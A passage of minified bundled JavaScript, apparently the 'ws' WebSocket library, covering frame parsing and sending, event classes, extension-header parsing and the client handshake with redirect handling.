V.length<32?H(V):$(V)}}catch($){}}),BD=R9((X,J)=>{var{Writable:Q}=v0("stream"),Y=IQ(),{BINARY_TYPES:W,EMPTY_BUFFER:G,kStatusCode:H,kWebSocket:z}=FX(),{concat:$,toArrayBuffer:V,unmask:K}=LQ(),{isValidStatusCode:Z,isValidUTF8:q}=Q5(),B=Buffer[Symbol.species],M=0,O=1,R=2,I=3,F=4,T=5,b=6;class h extends Q{constructor(L={}){super();this._allowSynchronousEvents=L.allowSynchronousEvents!==void 0?L.allowSynchronousEvents:!0,this._binaryType=L.binaryType||W[0],this._extensions=L.extensions||{},this._isServer=!!L.isServer,this._maxPayload=L.maxPayload|0,this._skipUTF8Validation=!!L.skipUTF8Validation,this[z]=void 0,this._bufferedBytes=0,this._buffers=[],this._compressed=!1,this._payloadLength=0,this._mask=void 0,this._fragmented=0,this._masked=!1,this._fin=!1,this._opcode=0,this._totalPayloadLength=0,this._messageLength=0,this._fragments=[],this._errored=!1,this._loop=!1,this._state=M}_write(L,N,k){if(this._opcode===8&&this._state==M)return k();this._bufferedBytes+=L.length,this._buffers.push(L),this.startLoop(k)}consume(L){if(this._bufferedBytes-=L,L===this._buffers[0].length)return this._buffers.shift();if(L<this._buffers[0].length){let k=this._buffers[0];return this._buffers[0]=new B(k.buffer,k.byteOffset+L,k.length-L),new B(k.buffer,k.byteOffset,L)}let N=Buffer.allocUnsafe(L);do{let k=this._buffers[0],_=N.length-L;if(L>=k.length)N.set(this._buffers.shift(),_);else N.set(new Uint8Array(k.buffer,k.byteOffset,L),_),this._buffers[0]=new B(k.buffer,k.byteOffset+L,k.length-L);L-=k.length}while(L>0);return N}startLoop(L){this._loop=!0;do switch(this._state){case M:this.getInfo(L);break;case O:this.getPayloadLength16(L);break;case R:this.getPayloadLength64(L);break;case I:this.getMask();break;case F:this.getData(L);break;case T:case b:this._loop=!1;return}while(this._loop);if(!this._errored)L()}getInfo(L){if(this._bufferedBytes<2){this._loop=!1;return}let N=this.consume(2);if((N[0]&48)!==0){let _=this.createError(RangeError,"RSV2 and RSV3 must be clear",!0,1002,"WS_ERR_UNEXPECTED_RSV_2_3");L(_);return}let k=(N[0]&64)===64;if(k&&!this._extensions[Y.extensionName]){let _=this.createError(RangeError,"RSV1 must be clear",!0,1002,"WS_ERR_UNEXPECTED_RSV_1");L(_);return}if(this._fin=(N[0]&128)===128,this._opcode=N[0]&15,this._payloadLength=N[1]&127,this._opcode===0){if(k){let _=this.createError(RangeError,"RSV1 must be clear",!0,1002,"WS_ERR_UNEXPECTED_RSV_1");L(_);return}if(!this._fragmented){let _=this.createError(RangeError,"invalid opcode 0",!0,1002,"WS_ERR_INVALID_OPCODE");L(_);return}this._opcode=this._fragmented}else if(this._opcode===1||this._opcode===2){if(this._fragmented){let _=this.createError(RangeError,`invalid opcode ${this._opcode}`,!0,1002,"WS_ERR_INVALID_OPCODE");L(_);return}this._compressed=k}else if(this._opcode>7&&this._opcode<11){if(!this._fin){let _=this.createError(RangeError,"FIN must be set",!0,1002,"WS_ERR_EXPECTED_FIN");L(_);return}if(k){let _=this.createError(RangeError,"RSV1 must be clear",!0,1002,"WS_ERR_UNEXPECTED_RSV_1");L(_);return}if(this._payloadLength>125||this._opcode===8&&this._payloadLength===1){let _=this.createError(RangeError,`invalid payload length ${this._payloadLength}`,!0,1002,"WS_ERR_INVALID_CONTROL_PAYLOAD_LENGTH");L(_);return}}else{let _=this.createError(RangeError,`invalid opcode ${this._opcode}`,!0,1002,"WS_ERR_INVALID_OPCODE");L(_);return}if(!this._fin&&!this._fragmented)this._fragmented=this._opcode;if(this._masked=(N[1]&128)===128,this._isServer){if(!this._masked){let _=this.createError(RangeError,"MASK must be set",!0,1002,"WS_ERR_EXPECTED_MASK");L(_);return}}else if(this._masked){let _=this.createError(RangeError,"MASK must be clear",!0,1002,"WS_ERR_UNEXPECTED_MASK");L(_);return}if(this._payloadLength===126)this._state=O;else if(this._payloadLength===127)this._state=R;else this.haveLength(L)}getPayloadLength16(L){if(this._bufferedBytes<2){this._loop=!1;return}this._payloadLength=this.consume(2).readUInt16BE(0),this.haveLength(L)}getPayloadLength64(L){if(this._bufferedBytes<8){this._loop=!1;return}let N=this.consume(8),k=N.readUInt32BE(0);if(k>Math.pow(2,21)-1){let _=this.createError(RangeError,"Unsupported WebSocket frame: payload length > 2^53 - 1",!1,1009,"WS_ERR_UNSUPPORTED_DATA_PAYLOAD_LENGTH");L(_);return}this._payloadLength=k*Math.pow(2,32)+N.readUInt32BE(4),this.haveLength(L)}haveLength(L){if(this._payloadLength&&this._opcode<8){if(this._totalPayloadLength+=this._payloadLength,this._totalPayloadLength>this._maxPayload&&this._maxPayload>0){let N=this.createError(RangeError,"Max payload size exceeded",!1,1009,"WS_ERR_UNSUPPORTED_MESSAGE_LENGTH");L(N);return}}if(this._masked)this._state=I;else this._state=F}getMask(){if(this._bufferedBytes<4){this._loop=!1;return}this._mask=this.consume(4),this._state=F}getData(L){let N=G;if(this._payloadLength){if(this._bufferedBytes<this._payloadLength){this._loop=!1;return}if(N=this.consume(this._payloadLength),this._masked&&(this._mask[0]|this._mask[1]|this._mask[2]|this._mask[3])!==0)K(N,this._mask)}if(this._opcode>7){this.controlMessage(N,L);return}if(this._compressed){this._state=T,this.decompress(N,L);return}if(N.length)this._messageLength=this._totalPayloadLength,this._fragments.push(N);this.dataMessage(L)}decompress(L,N){this._extensions[Y.extensionName].decompress(L,this._fin,(_,c)=>{if(_)return N(_);if(c.length){if(this._messageLength+=c.length,this._messageLength>this._maxPayload&&this._maxPayload>0){let a=this.createError(RangeError,"Max payload size exceeded",!1,1009,"WS_ERR_UNSUPPORTED_MESSAGE_LENGTH");N(a);return}this._fragments.push(c)}if(this.dataMessage(N),this._state===M)this.startLoop(N)})}dataMessage(L){if(!this._fin){this._state=M;return}let N=this._messageLength,k=this._fragments;if(this._totalPayloadLength=0,this._messageLength=0,this._fragmented=0,this._fragments=[],this._opcode===2){let _;if(this._binaryType==="nodebuffer")_=$(k,N);else if(this._binaryType==="arraybuffer")_=V($(k,N));else if(this._binaryType==="blob")_=new Blob(k);else _=k;if(this._allowSynchronousEvents)this.emit("message",_,!0),this._state=M;else this._state=b,setImmediate(()=>{this.emit("message",_,!0),this._state=M,this.startLoop(L)})}else{let _=$(k,N);if(!this._skipUTF8Validation&&!q(_)){let c=this.createError(Error,"invalid UTF-8 sequence",!0,1007,"WS_ERR_INVALID_UTF8");L(c);return}if(this._state===T||this._allowSynchronousEvents)this.emit("message",_,!1),this._state=M;else this._state=b,setImmediate(()=>{this.emit("message",_,!1),this._state=M,this.startLoop(L)})}}controlMessage(L,N){if(this._opcode===8){if(L.length===0)this._loop=!1,this.emit("conclude",1005,G),this.end();else{let k=L.readUInt16BE(0);if(!Z(k)){let c=this.createError(RangeError,`invalid status code ${k}`,!0,1002,"WS_ERR_INVALID_CLOSE_CODE");N(c);return}let _=new B(L.buffer,L.byteOffset+2,L.length-2);if(!this._skipUTF8Validation&&!q(_)){let c=this.createError(Error,"invalid UTF-8 sequence",!0,1007,"WS_ERR_INVALID_UTF8");N(c);return}this._loop=!1,this.emit("conclude",k,_),this.end()}this._state=M;return}if(this._allowSynchronousEvents)this.emit(this._opcode===9?"ping":"pong",L),this._state=M;else this._state=b,setImmediate(()=>{this.emit(this._opcode===9?"ping":"pong",L),this._state=M,this.startLoop(N)})}createError(L,N,k,_,c){this._loop=!1,this._errored=!0;let a=new L(k?`Invalid WebSocket frame: ${N}`:N);return Error.captureStackTrace(a,this.createError),a.code=c,a[H]=_,a}}J.exports=h}),MD=R9((X,J)=>{var{Duplex:Q}=v0("stream"),{randomFillSync:Y}=v0("crypto"),W=IQ(),{EMPTY_BUFFER:G,kWebSocket:H,NOOP:z}=FX(),{isBlob:$,isValidStatusCode:V}=Q5(),{mask:K,toBuffer:Z}=LQ(),q=Symbol("kByteLength"),B=Buffer.alloc(4),M=8192,O,R=M,I=0,F=1,T=2;class b{constructor(N,k,_){if(this._extensions=k||{},_)this._generateMask=_,this._maskBuffer=Buffer.alloc(4);this._socket=N,this._firstFragment=!0,this._compress=!1,this._bufferedBytes=0,this._queue=[],this._state=I,this.onerror=z,this[H]=void 0}static frame(N,k){let _,c=!1,a=2,J1=!1;if(k.mask){if(_=k.maskBuffer||B,k.generateMask)k.generateMask(_);else{if(R===M){if(O===void 0)O=Buffer.alloc(M);Y(O,0,M),R=0}_[0]=O[R++],_[1]=O[R++],_[2]=O[R++],_[3]=O[R++]}J1=(_[0]|_[1]|_[2]|_[3])===0,a=6}let q1;if(typeof N==="string")if((!k.mask||J1)&&k[q]!==void 0)q1=k[q];else N=Buffer.from(N),q1=N.length;else q1=N.length,c=k.mask&&k.readOnly&&!J1;let _1=q1;if(q1>=65536)a+=8,_1=127;else if(q1>125)a+=2,_1=126;let M1=Buffer.allocUnsafe(c?q1+a:a);if(M1[0]=k.fin?k.opcode|128:k.opcode,k.rsv1)M1[0]|=64;if(M1[1]=_1,_1===126)M1.writeUInt16BE(q1,2);else if(_1===127)M1[2]=M1[3]=0,M1.writeUIntBE(q1,4,6);if(!k.mask)return[M1,N];if(M1[1]|=128,M1[a-4]=_[0],M1[a-3]=_[1],M1[a-2]=_[2],M1[a-1]=_[3],J1)return[M1,N];if(c)return K(N,_,M1,a,q1),[M1];return K(N,_,N,0,q1),[M1,N]}close(N,k,_,c){let a;if(N===void 0)a=G;else if(typeof N!=="number"||!V(N))throw TypeError("First argument must be a valid error code number");else if(k===void 0||!k.length)a=Buffer.allocUnsafe(2),a.writeUInt16BE(N,0);else{let q1=Buffer.byteLength(k);if(q1>123)throw RangeError("The message must not be greater than 123 bytes");if(a=Buffer.allocUnsafe(2+q1),a.writeUInt16BE(N,0),typeof k==="string")a.write(k,2);else a.set(k,2)}let J1={[q]:a.length,fin:!0,generateMask:this._generateMask,mask:_,maskBuffer:this._maskBuffer,opcode:8,readOnly:!1,rsv1:!1};if(this._state!==I)this.enqueue([this.dispatch,a,!1,J1,c]);else this.sendFrame(b.frame(a,J1),c)}ping(N,k,_){let c,a;if(typeof N==="string")c=Buffer.byteLength(N),a=!1;else if($(N))c=N.size,a=!1;else N=Z(N),c=N.length,a=Z.readOnly;if(c>125)throw RangeError("The data size must not be greater than 125 bytes");let J1={[q]:c,fin:!0,generateMask:this._generateMask,mask:k,maskBuffer:this._maskBuffer,opcode:9,readOnly:a,rsv1:!1};if($(N))if(this._state!==I)this.enqueue([this.getBlobData,N,!1,J1,_]);else this.getBlobData(N,!1,J1,_);else if(this._state!==I)this.enqueue([this.dispatch,N,!1,J1,_]);else this.sendFrame(b.frame(N,J1),_)}pong(N,k,_){let c,a;if(typeof N==="string")c=Buffer.byteLength(N),a=!1;else if($(N))c=N.size,a=!1;else N=Z(N),c=N.length,a=Z.readOnly;if(c>125)throw RangeError("The data size must not be greater than 125 bytes");let J1={[q]:c,fin:!0,generateMask:this._generateMask,mask:k,maskBuffer:this._maskBuffer,opcode:10,readOnly:a,rsv1:!1};if($(N))if(this._state!==I)this.enqueue([this.getBlobData,N,!1,J1,_]);else this.getBlobData(N,!1,J1,_);else if(this._state!==I)this.enqueue([this.dispatch,N,!1,J1,_]);else this.sendFrame(b.frame(N,J1),_)}send(N,k,_){let c=this._extensions[W.extensionName],a=k.binary?2:1,J1=k.compress,q1,_1;if(typeof N==="string")q1=Buffer.byteLength(N),_1=!1;else if($(N))q1=N.size,_1=!1;else N=Z(N),q1=N.length,_1=Z.readOnly;if(this._firstFragment){if(this._firstFragment=!1,J1&&c&&c.params[c._isServer?"server_no_context_takeover":"client_no_context_takeover"])J1=q1>=c._threshold;this._compress=J1}else J1=!1,a=0;if(k.fin)this._firstFragment=!0;let M1={[q]:q1,fin:k.fin,generateMask:this._generateMask,mask:k.mask,maskBuffer:this._maskBuffer,opcode:a,readOnly:_1,rsv1:J1};if($(N))if(this._state!==I)this.enqueue([this.getBlobData,N,this._compress,M1,_]);else this.getBlobData(N,this._compress,M1,_);else if(this._state!==I)this.enqueue([this.dispatch,N,this._compress,M1,_]);else this.dispatch(N,this._compress,M1,_)}getBlobData(N,k,_,c){this._bufferedBytes+=_[q],this._state=T,N.arrayBuffer().then((a)=>{if(this._socket.destroyed){let q1=Error("The socket was closed while the blob was being read");process.nextTick(h,this,q1,c);return}this._bufferedBytes-=_[q];let J1=Z(a);if(!k)this._state=I,this.sendFrame(b.frame(J1,_),c),this.dequeue();else this.dispatch(J1,k,_,c)}).catch((a)=>{process.nextTick(L,this,a,c)})}dispatch(N,k,_,c){if(!k){this.sendFrame(b.frame(N,_),c);return}let a=this._extensions[W.extensionName];this._bufferedBytes+=_[q],this._state=F,a.compress(N,_.fin,(J1,q1)=>{if(this._socket.destroyed){let _1=Error("The socket was closed while data was being compressed");h(this,_1,c);return}this._bufferedBytes-=_[q],this._state=I,_.readOnly=!1,this.sendFrame(b.frame(q1,_),c),this.dequeue()})}dequeue(){while(this._state===I&&this._queue.length){let N=this._queue.shift();this._bufferedBytes-=N[3][q],Reflect.apply(N[0],this,N.slice(1))}}enqueue(N){this._bufferedBytes+=N[3][q],this._queue.push(N)}sendFrame(N,k){if(N.length===2)this._socket.cork(),this._socket.write(N[0]),this._socket.write(N[1],k),this._socket.uncork();else this._socket.write(N[0],k)}}J.exports=b;function h(N,k,_){if(typeof _==="function")_(k);for(let c=0;c<N._queue.length;c++){let a=N._queue[c],J1=a[a.length-1];if(typeof J1==="function")J1(k)}}function L(N,k,_){h(N,k,_),N.onerror(k)}}),fx1=R9((X,J)=>{var{kForOnEventAttribute:Q,kListener:Y}=FX(),W=Symbol("kCode"),G=Symbol("kData"),H=Symbol("kError"),z=Symbol("kMessage"),$=Symbol("kReason"),V=Symbol("kTarget"),K=Symbol("kType"),Z=Symbol("kWasClean");class q{constructor(F){this[V]=null,this[K]=F}get target(){return this[V]}get type(){return this[K]}}Object.defineProperty(q.prototype,"target",{enumerable:!0}),Object.defineProperty(q.prototype,"type",{enumerable:!0});class B extends q{constructor(F,T={}){super(F);this[W]=T.code===void 0?0:T.code,this[$]=T.reason===void 0?"":T.reason,this[Z]=T.wasClean===void 0?!1:T.wasClean}get code(){return this[W]}get reason(){return this[$]}get wasClean(){return this[Z]}}Object.defineProperty(B.prototype,"code",{enumerable:!0}),Object.defineProperty(B.prototype,"reason",{enumerable:!0}),Object.defineProperty(B.prototype,"wasClean",{enumerable:!0});class M extends q{constructor(F,T={}){super(F);this[H]=T.error===void 0?null:T.error,this[z]=T.message===void 0?"":T.message}get error(){return this[H]}get message(){return this[z]}}Object.defineProperty(M.prototype,"error",{enumerable:!0}),Object.defineProperty(M.prototype,"message",{enumerable:!0});class O extends q{constructor(F,T={}){super(F);this[G]=T.data===void 0?null:T.data}get data(){return this[G]}}Object.defineProperty(O.prototype,"data",{enumerable:!0});var R={addEventListener(F,T,b={}){for(let L of this.listeners(F))if(!b[Q]&&L[Y]===T&&!L[Q])return;let h;if(F==="message")h=function(N,k){let _=new O("message",{data:k?N:N.toString()});_[V]=this,I(T,this,_)};else if(F==="close")h=function(N,k){let _=new B("close",{code:N,reason:k.toString(),wasClean:this._closeFrameReceived&&this._closeFrameSent});_[V]=this,I(T,this,_)};else if(F==="error")h=function(N){let k=new M("error",{error:N,message:N.message});k[V]=this,I(T,this,k)};else if(F==="open")h=function(){let N=new q("open");N[V]=this,I(T,this,N)};else return;if(h[Q]=!!b[Q],h[Y]=T,b.once)this.once(F,h);else this.on(F,h)},removeEventListener(F,T){for(let b of this.listeners(F))if(b[Y]===T&&!b[Q]){this.removeListener(F,b);break}}};J.exports={CloseEvent:B,ErrorEvent:M,Event:q,EventTarget:R,MessageEvent:O};function I(F,T,b){if(typeof F==="object"&&F.handleEvent)F.handleEvent.call(F,b);else F.call(T,b)}}),jD=R9((X,J)=>{var{tokenChars:Q}=Q5();function Y(H,z,$){if(H[z]===void 0)H[z]=[$];else H[z].push($)}function W(H){let z=Object.create(null),$=Object.create(null),V=!1,K=!1,Z=!1,q,B,M=-1,O=-1,R=-1,I=0;for(;I<H.length;I++)if(O=H.charCodeAt(I),q===void 0)if(R===-1&&Q[O]===1){if(M===-1)M=I}else if(I!==0&&(O===32||O===9)){if(R===-1&&M!==-1)R=I}else if(O===59||O===44){if(M===-1)throw SyntaxError(`Unexpected character at index ${I}`);if(R===-1)R=I;let T=H.slice(M,R);if(O===44)Y(z,T,$),$=Object.create(null);else q=T;M=R=-1}else throw SyntaxError(`Unexpected character at index ${I}`);else if(B===void 0)if(R===-1&&Q[O]===1){if(M===-1)M=I}else if(O===32||O===9){if(R===-1&&M!==-1)R=I}else if(O===59||O===44){if(M===-1)throw SyntaxError(`Unexpected character at index ${I}`);if(R===-1)R=I;if(Y($,H.slice(M,R),!0),O===44)Y(z,q,$),$=Object.create(null),q=void 0;M=R=-1}else if(O===61&&M!==-1&&R===-1)B=H.slice(M,I),M=R=-1;else throw SyntaxError(`Unexpected character at index ${I}`);else if(K){if(Q[O]!==1)throw SyntaxError(`Unexpected character at index ${I}`);if(M===-1)M=I;else if(!V)V=!0;K=!1}else if(Z)if(Q[O]===1){if(M===-1)M=I}else if(O===34&&M!==-1)Z=!1,R=I;else if(O===92)K=!0;else throw SyntaxError(`Unexpected character at index ${I}`);else if(O===34&&H.charCodeAt(I-1)===61)Z=!0;else if(R===-1&&Q[O]===1){if(M===-1)M=I}else if(M!==-1&&(O===32||O===9)){if(R===-1)R=I}else if(O===59||O===44){if(M===-1)throw SyntaxError(`Unexpected character at index ${I}`);if(R===-1)R=I;let T=H.slice(M,R);if(V)T=T.replace(/\\/g,""),V=!1;if(Y($,B,T),O===44)Y(z,q,$),$=Object.create(null),q=void 0;B=void 0,M=R=-1}else throw SyntaxError(`Unexpected character at index ${I}`);if(M===-1||Z||O===32||O===9)throw SyntaxError("Unexpected end of input");if(R===-1)R=I;let F=H.slice(M,R);if(q===void 0)Y(z,F,$);else{if(B===void 0)Y($,F,!0);else if(V)Y($,B,F.replace(/\\/g,""));else Y($,B,F);Y(z,q,$)}return z}function G(H){return Object.keys(H).map((z)=>{let $=H[z];if(!Array.isArray($))$=[$];return $.map((V)=>{return[z].concat(Object.keys(V).map((K)=>{let Z=V[K];if(!Array.isArray(Z))Z=[Z];return Z.map((q)=>q===!0?K:`${K}=${q}`).join("; ")})).join("; ")}).join(", ")}).join(", ")}J.exports={format:G,parse:W}}),vG=R9((X,J)=>{var Q=v0("events"),Y=v0("https"),W=v0("http"),G=v0("net"),H=v0("tls"),{randomBytes:z,createHash:$}=v0("crypto"),{Duplex:V,Readable:K}=v0("stream"),{URL:Z}=v0("url"),q=IQ(),B=BD(),M=MD(),{isBlob:O}=Q5(),{BINARY_TYPES:R,EMPTY_BUFFER:I,GUID:F,kForOnEventAttribute:T,kListener:b,kStatusCode:h,kWebSocket:L,NOOP:N}=FX(),{EventTarget:{addEventListener:k,removeEventListener:_}}=fx1(),{format:c,parse:a}=jD(),{toBuffer:J1}=LQ(),q1=30000,_1=Symbol("kAborted"),M1=[8,13],k1=["CONNECTING","OPEN","CLOSING","CLOSED"],r=/^[!#$%&'*+\-.0-9A-Z^_`|a-z~]+$/;class y extends Q{constructor(P,g,t){super();if(this._binaryType=R[0],this._closeCode=1006,this._closeFrameReceived=!1,this._closeFrameSent=!1,this._closeMessage=I,this._closeTimer=null,this._errorEmitted=!1,this._extensions={},this._paused=!1,this._protocol="",this._readyState=y.CONNECTING,this._receiver=null,this._sender=null,this._socket=null,P!==null){if(this._bufferedAmount=0,this._isServer=!1,this._redirects=0,g===void 0)g=[];else if(!Array.isArray(g))if(typeof g==="object"&&g!==null)t=g,g=[];else g=[g];m(this,P,g,t)}else this._autoPong=t.autoPong,this._isServer=!0}get binaryType(){return this._binaryType}set binaryType(P){if(!R.includes(P))return;if(this._binaryType=P,this._receiver)this._receiver._binaryType=P}get bufferedAmount(){if(!this._socket)return this._bufferedAmount;return this._socket._writableState.length+this._sender._bufferedBytes}get extensions(){return Object.keys(this._extensions).join()}get isPaused(){return this._paused}get onclose(){return null}get onerror(){return null}get onopen(){return null}get onmessage(){return null}get protocol(){return this._protocol}get readyState(){return this._readyState}get url(){return this._url}setSocket(P,g,t){let U1=new B({allowSynchronousEvents:t.allowSynchronousEvents,binaryType:this.binaryType,extensions:this._extensions,isServer:this._isServer,maxPayload:t.maxPayload,skipUTF8Validation:t.skipUTF8Validation}),$1=new M(P,this._extensions,t.generateMask);if(this._receiver=U1,this._sender=$1,this._socket=P,U1[L]=this,$1[L]=this,P[L]=this,U1.on("conclude",X0),U1.on("drain",m1),U1.on("error",C1),U1.on("message",o1),U1.on("ping",v1),U1.on("pong",i),$1.onerror=G0,P.setTimeout)P.setTimeout(0);if(P.setNoDelay)P.setNoDelay();if(g.length>0)P.unshift(g);P.on("close",C0),P.on("data",n),P.on("end",d),P.on("error",z1),this._readyState=y.OPEN,this.emit("open")}emitClose(){if(!this._socket){this._readyState=y.CLOSED,this.emit("close",this._closeCode,this._closeMessage);return}if(this._extensions[q.extensionName])this._extensions[q.extensionName].cleanup();this._receiver.removeAllListeners(),this._readyState=y.CLOSED,this.emit("close",this._closeCode,this._closeMessage)}close(P,g){if(this.readyState===y.CLOSED)return;if(this.readyState===y.CONNECTING){b1(this,this._req,"WebSocket was closed before the connection was established");return}if(this.readyState===y.CLOSING){if(this._closeFrameSent&&(this._closeFrameReceived||this._receiver._writableState.errorEmitted))this._socket.end();return}this._readyState=y.CLOSING,this._sender.close(P,g,!this._isServer,(t)=>{if(t)return;if(this._closeFrameSent=!0,this._closeFrameReceived||this._receiver._writableState.errorEmitted)this._socket.end()}),U0(this)}pause(){if(this.readyState===y.CONNECTING||this.readyState===y.CLOSED)return;this._paused=!0,this._socket.pause()}ping(P,g,t){if(this.readyState===y.CONNECTING)throw Error("WebSocket is not open: readyState 0 (CONNECTING)");if(typeof P==="function")t=P,P=g=void 0;else if(typeof g==="function")t=g,g=void 0;if(typeof P==="number")P=P.toString();if(this.readyState!==y.OPEN){p1(this,P,t);return}if(g===void 0)g=!this._isServer;this._sender.ping(P||I,g,t)}pong(P,g,t){if(this.readyState===y.CONNECTING)throw Error("WebSocket is not open: readyState 0 (CONNECTING)");if(typeof P==="function")t=P,P=g=void 0;else if(typeof g==="function")t=g,g=void 0;if(typeof P==="number")P=P.toString();if(this.readyState!==y.OPEN){p1(this,P,t);return}if(g===void 0)g=!this._isServer;this._sender.pong(P||I,g,t)}resume(){if(this.readyState===y.CONNECTING||this.readyState===y.CLOSED)return;if(this._paused=!1,!this._receiver._writableState.needDrain)this._socket.resume()}send(P,g,t){if(this.readyState===y.CONNECTING)throw Error("WebSocket is not open: readyState 0 (CONNECTING)");if(typeof g==="function")t=g,g={};if(typeof P==="number")P=P.toString();if(this.readyState!==y.OPEN){p1(this,P,t);return}let U1={binary:typeof P!=="string",mask:!this._isServer,compress:!0,fin:!0,...g};if(!this._extensions[q.extensionName])U1.compress=!1;this._sender.send(P||I,U1,t)}terminate(){if(this.readyState===y.CLOSED)return;if(this.readyState===y.CONNECTING){b1(this,this._req,"WebSocket was closed before the connection was established");return}if(this._socket)this._readyState=y.CLOSING,this._socket.destroy()}}Object.defineProperty(y,"CONNECTING",{enumerable:!0,value:k1.indexOf("CONNECTING")}),Object.defineProperty(y.prototype,"CONNECTING",{enumerable:!0,value:k1.indexOf("CONNECTING")}),Object.defineProperty(y,"OPEN",{enumerable:!0,value:k1.indexOf("OPEN")}),Object.defineProperty(y.prototype,"OPEN",{enumerable:!0,value:k1.indexOf("OPEN")}),Object.defineProperty(y,"CLOSING",{enumerable:!0,value:k1.indexOf("CLOSING")}),Object.defineProperty(y.prototype,"CLOSING",{enumerable:!0,value:k1.indexOf("CLOSING")}),Object.defineProperty(y,"CLOSED",{enumerable:!0,value:k1.indexOf("CLOSED")}),Object.defineProperty(y.prototype,"CLOSED",{enumerable:!0,value:k1.indexOf("CLOSED")}),["binaryType","bufferedAmount","extensions","isPaused","protocol","readyState","url"].forEach((P)=>{Object.defineProperty(y.prototype,P,{enumerable:!0})}),["open","error","close","message"].forEach((P)=>{Object.defineProperty(y.prototype,`on${P}`,{enumerable:!0,get(){for(let g of this.listeners(P))if(g[T])return g[b];return null},set(g){for(let t of this.listeners(P))if(t[T]){this.removeListener(P,t);break}if(typeof g!=="function")return;this.addEventListener(P,g,{[T]:!0})}})}),y.prototype.addEventListener=k,y.prototype.removeEventListener=_,J.exports=y;function m(P,g,t,U1){let $1={allowSynchronousEvents:!0,autoPong:!0,protocolVersion:M1[1],maxPayload:104857600,skipUTF8Validation:!1,perMessageDeflate:!0,followRedirects:!1,maxRedirects:10,...U1,socketPath:void 0,hostname:void 0,protocol:void 0,timeout:void 0,method:"GET",host:void 0,path:void 0,port:void 0};if(P._autoPong=$1.autoPong,!M1.includes($1.protocolVersion))throw RangeError(`Unsupported protocol version: ${$1.protocolVersion} (supported versions: ${M1.join(", ")})`);let d1;if(g instanceof Z)d1=g;else try{d1=new Z(g)}catch(a1){throw SyntaxError(`Invalid URL: ${g}`)}if(d1.protocol==="http:")d1.protocol="ws:";else if(d1.protocol==="https:")d1.protocol="wss:";P._url=d1.href;let U9=d1.protocol==="wss:",Z9=d1.protocol==="ws+unix:",q9;if(d1.protocol!=="ws:"&&!U9&&!Z9)q9=`The URL's protocol must be one of "ws:", "wss:", "http:", "https:", or "ws+unix:"`;else if(Z9&&!d1.pathname)q9="The URL's pathname is empty";else if(d1.hash)q9="The URL contains a fragment identifier";if(q9){let a1=SyntaxError(q9);if(P._redirects===0)throw a1;else{W1(P,a1);return}}let o9=U9?443:80,t9=z(16).toString("base64"),F6=U9?Y.request:W.request,i0=new Set,B9;if($1.createConnection=$1.createConnection||(U9?f1:F1),$1.defaultPort=$1.defaultPort||o9,$1.port=d1.port||o9,$1.host=d1.hostname.startsWith("[")?d1.hostname.slice(1,-1):d1.hostname,$1.headers={...$1.headers,"Sec-WebSocket-Version":$1.protocolVersion,"Sec-WebSocket-Key":t9,Connection:"Upgrade",Upgrade:"websocket"},$1.path=d1.pathname+d1.search,$1.timeout=$1.handshakeTimeout,$1.perMessageDeflate)B9=new q($1.perMessageDeflate!==!0?$1.perMessageDeflate:{},!1,$1.maxPayload),$1.headers["Sec-WebSocket-Extensions"]=c({[q.extensionName]:B9.offer()});if(t.length){for(let a1 of t){if(typeof a1!=="string"||!r.test(a1)||i0.has(a1))throw SyntaxError("An invalid or duplicated subprotocol was specified");i0.add(a1)}$1.headers["Sec-WebSocket-Protocol"]=t.join(",")}if($1.origin)if($1.protocolVersion<13)$1.headers["Sec-WebSocket-Origin"]=$1.origin;else $1.headers.Origin=$1.origin;if(d1.username||d1.password)$1.auth=`${d1.username}:${d1.password}`;if(Z9){let a1=$1.path.split(":");$1.socketPath=a1[0],$1.path=a1[1]}let B0;if($1.followRedirects){if(P._redirects===0){P._originalIpc=Z9,P._originalSecure=U9,P._originalHostOrSocketPath=Z9?$1.socketPath:d1.host;let a1=U1&&U1.headers;if(U1={...U1,headers:{}},a1)for(let[g0,R6]of Object.entries(a1))U1.headers[g0.toLowerCase()]=R6}else if(P.listenerCount("redirect")===0){let a1=Z9?P._originalIpc?$1.socketPath===P._originalHostOrSocketPath:!1:P._originalIpc?!1:d1.host===P._originalHostOrSocketPath;if(!a1||P._originalSecure&&!U9){if(delete $1.headers.authorization,delete $1.headers.cookie,!a1)delete $1.headers.host;$1.auth=void 0}}if($1.auth&&!U1.headers.authorization)U1.headers.authorization="Basic "+Buffer.from($1.auth).toString("base64");if(B0=P._req=F6($1),P._redirects)P.emit("redirect",P.url,B0)}else B0=P._req=F6($1);if($1.timeout)B0.on("timeout",()=>{b1(P,B0,"Opening handshake has timed out")});if(B0.on("error",(a1)=>{if(B0===null||B0[_1])return;B0=P._req=null,W1(P,a1)}),B0.on("response",(a1)=>{let g0=a1.headers.location,R6=a1.statusCode;if(g0&&$1.followRedirects&&R6>=300&&R6<400){if(++P._redirects>$1.maxRedirects){b1(P,B0,"Maximum redirects exceeded");return}B0.abort();let f;try{f=new Z(g0,g)}catch(l){let p=SyntaxError(`Invalid URL: ${g0}`);W1(P,p);return}m(P,f,t,U1)}else if(!P.emit("unexpected-response",B0,a1))b1(P,B0,`Unexpected server response: ${a1.statusCode}`)}),B0.on("upgrade",(a1,g0,R6)=>{if(P.emit("upgrade",a1),P.readyState!==y.CONNECTING)return;B0=P._req=null;let f=a1.headers.upgrade;if(f===void 0||f.toLowerCase()!=="websocket"){b1(P,g0,"Invalid Upgrade header");return}let l=$("sha1").update(t9+F).digest("base64");if(a1.headers["sec-websocket-accept"]!==l){b1(P,g0,"Invalid Sec-WebSocket-Accept header");return}let p=a1.headers["sec-websocket-protocol"],X1;if(p!==void 0){if(!i0.size)X1="Server sent a subprotocol but none was requested";else if(!i0.has(p))X1="Server sent an invalid subprotocol"}else if(i0.size)X1="Server sent no subprotocol";if(X1){b1(P,g0,X1);return}if(p)P._protocol=p;let N1=a1.headers["sec-websocket-extensions"];if(N1!==void 0){if(!B9){b1(P,g0,"Server sent a Sec-WebSocket-Extensions header but no extension was requested");return}let j1;try{j1=a(N1)}catch(t1){b1(P,g0,"Invalid Sec-WebSocket-Extensions header");return}let r1=Object.keys(j1);if(r1.length!==1||r1[0]!==q.extensionName){b1(P,g0,"Server indicated an extension that was not requested");return}try{B9.accept(j1[q.extensionName])}catch(t1){b1(P,g0,"Invalid Sec-WebSocket-Extensions header");return}P._extensions[q.extensionName]=B9}P.setSocket(g0,R6,{allowSynchronousEvents:$1.allowSynchronousEvents,generateMask:$1.generateMask,maxPayload:$1.maxPayload,skipUTF8Validation:$1.skipUTF8Validation})}),$1.finishRequest)$1.finishRequest(B0,P);else B0.end()}function 